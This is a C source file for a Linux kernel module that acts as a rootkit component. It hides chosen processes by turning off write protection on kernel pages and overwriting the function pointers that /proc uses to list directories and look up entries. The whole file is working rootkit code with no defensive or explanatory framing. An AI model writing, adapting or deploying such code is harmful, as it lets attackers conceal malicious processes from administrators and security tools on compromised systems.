#include "hide_proc.h"
#include "inline_hook/p_lkrg_main.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/namei.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/vmalloc.h>
#include <linux/dcache.h>
#include <asm/pgtable.h>
#include <asm/tlbflush.h>
#include <linux/sched/task.h> // For init_task

// --- PID list management (copied from original) ---
struct hidden_pid_entry {
    struct list_head list;
    pid_t pid;
};

static LIST_HEAD(hidden_pids);
static DEFINE_SPINLOCK(hidden_lock);

bool is_pid_hidden(pid_t pid) {
    struct hidden_pid_entry *entry;
    bool found = false;

    spin_lock(&hidden_lock);
    list_for_each_entry(entry, &hidden_pids, list) {
        if (entry->pid == pid) {
            found = true;
            break;
        }
    }
    spin_unlock(&hidden_lock);

    return found;
}

void add_hidden_pid(pid_t pid) {
    struct hidden_pid_entry *new_entry;

    if (is_pid_hidden(pid))
        return;

    new_entry = kmalloc(sizeof(struct hidden_pid_entry), GFP_KERNEL);
    if (!new_entry)
        return;

    new_entry->pid = pid;

    spin_lock(&hidden_lock);
    list_add(&new_entry->list, &hidden_pids);
    spin_unlock(&hidden_lock);

    printk(KERN_INFO "[hide_proc] Added PID %d to hidden list\n", pid);
}

void remove_hidden_pid(pid_t pid) {
    struct hidden_pid_entry *entry, *tmp;

    spin_lock(&hidden_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        if (entry->pid == pid) {
            list_del(&entry->list);
            kfree(entry);
            printk(KERN_INFO "[hide_proc] Removed PID %d from hidden list\n", pid);
            break;
        }
    }
    spin_unlock(&hidden_lock);
}

void clear_hidden_pids(void) {
    struct hidden_pid_entry *entry, *tmp;

    spin_lock(&hidden_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        list_del(&entry->list);
        kfree(entry);
    }
    spin_unlock(&hidden_lock);

    printk(KERN_INFO "[hide_proc] Cleared all hidden PIDs\n");
}


// --- New implementation using function pointer overwrite ---

// Pointers to store the original functions
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
static int (*original_iterate)(struct file *, struct dir_context *);
#else
static int (*original_iterate)(struct file *, void *, filldir_t);
#endif
static struct dentry * (*original_lookup)(struct inode *,struct dentry *, unsigned int);

static int write_ro_kernel_data(void *addr, void *new_val_ptr, size_t size)
{
    pte_t *pte;
    unsigned long address = (unsigned long)addr;

    pte = get_pte_from_address(P_SYM(p_init_mm), address);
    if (!pte) {
        printk(KERN_ERR "[hide_proc] Failed to get PTE for address %p\n", addr);
        return -EFAULT;
    }

    // Make page writable
    set_pte(pte, pte_mkwrite(*pte));
    flush_tlb_kernel_range(address, address + size);

    // Write the data
    memcpy(addr, new_val_ptr, size);

    // Restore page protection
    set_pte(pte, pte_wrprotect(*pte));
    flush_tlb_kernel_range(address, address + size);

    return 0;
}


int hide_proc_init(void) {
    struct path proc_path;
    struct inode *proc_inode;
    struct file_operations *fops;
    struct inode_operations *iops;
    int ret;

    printk(KERN_INFO "[hide_proc] Initializing process hiding (function pointer overwrite)\n");

    if (!P_SYM(p_init_mm)) {
        printk(KERN_ERR "[hide_proc] Failed to get kernel mm_struct from inline_hook module.\n");
        return -EFAULT;
    }

    ret = kern_path("/proc", LOOKUP_FOLLOW, &proc_path);
    if (ret) {
        printk(KERN_ERR "[hide_proc] Failed to get /proc path: %d\n", ret);
        return ret;
    }

    proc_inode = proc_path.dentry->d_inode;
    if (!proc_inode || !proc_inode->i_fop || !proc_inode->i_op) {
        printk(KERN_ERR "[hide_proc] Failed to get /proc inode operations\n");
        path_put(&proc_path);
        return -ENOENT;
    }

    fops = (struct file_operations *)proc_inode->i_fop;
    iops = (struct inode_operations *)proc_inode->i_op;
    path_put(&proc_path);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    original_iterate = fops->iterate_shared ? fops->iterate_shared : fops->iterate;
#else
    original_iterate = fops->readdir;
#endif
    original_lookup = iops->lookup;

    if (!original_iterate || !original_lookup) {
        printk(KERN_ERR "[hide_proc] Failed to find readdir/lookup function pointers.\n");
        return -ENOENT;
    }

    preempt_disable();
    
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    if (fops->iterate_shared) {
        ret = write_ro_kernel_data(&fops->iterate_shared, &hooked_iterate, sizeof(void *));
    } else {
        ret = write_ro_kernel_data(&fops->iterate, &hooked_iterate, sizeof(void *));
    }
#else
    ret = write_ro_kernel_data(&fops->readdir, &hooked_iterate, sizeof(void *));
#endif
    if (ret) {
        preempt_enable();
        printk(KERN_ERR "[hide_proc] Failed to hook readdir function.\n");
        return ret;
    }

    ret = write_ro_kernel_data(&iops->lookup, &hooked_lookup, sizeof(void *));
    if (ret) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
        if (fops->iterate_shared) write_ro_kernel_data(&fops->iterate_shared, &original_iterate, sizeof(void *));
        else write_ro_kernel_data(&fops->iterate, &original_iterate, sizeof(void *));
#else
        write_ro_kernel_data(&fops->readdir, &original_iterate, sizeof(void *));
#endif
        preempt_enable();
        printk(KERN_ERR "[hide_proc] Failed to hook lookup function.\n");
        return ret;
    }
    preempt_enable();

    printk(KERN_INFO "[hide_proc] Successfully hooked /proc operations.\n");
    return 0;
}

void hide_proc_exit(void) {
    struct path proc_path;
    struct inode *proc_inode;
    struct file_operations *fops;
    struct inode_operations *iops;
    int ret;

    printk(KERN_INFO "[hide_proc] Exiting process hiding (restoring pointers)\n");

    if (!original_iterate || !original_lookup) {
        return;
    }

    ret = kern_path("/proc", LOOKUP_FOLLOW, &proc_path);
    if (ret) {
        printk(KERN_ERR "[hide_proc] Failed to get /proc path for exit: %d\n", ret);
        return;
    }

    proc_inode = proc_path.dentry->d_inode;
    fops = (struct file_operations *)proc_inode->i_fop;
    iops = (struct inode_operations *)proc_inode->i_op;
    path_put(&proc_path);

    preempt_disable();
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    if (fops->iterate_shared) write_ro_kernel_data(&fops->iterate_shared, &original_iterate, sizeof(void *));
    else write_ro_kernel_data(&fops->iterate, &original_iterate, sizeof(void *));
#else
    write_ro_kernel_data(&fops->readdir, &original_iterate, sizeof(void *));
#endif
    write_ro_kernel_data(&iops->lookup, &original_lookup, sizeof(void *));
    preempt_enable();

    clear_hidden_pids();
    printk(KERN_INFO "[hide_proc] Restored /proc operations.\n");
}
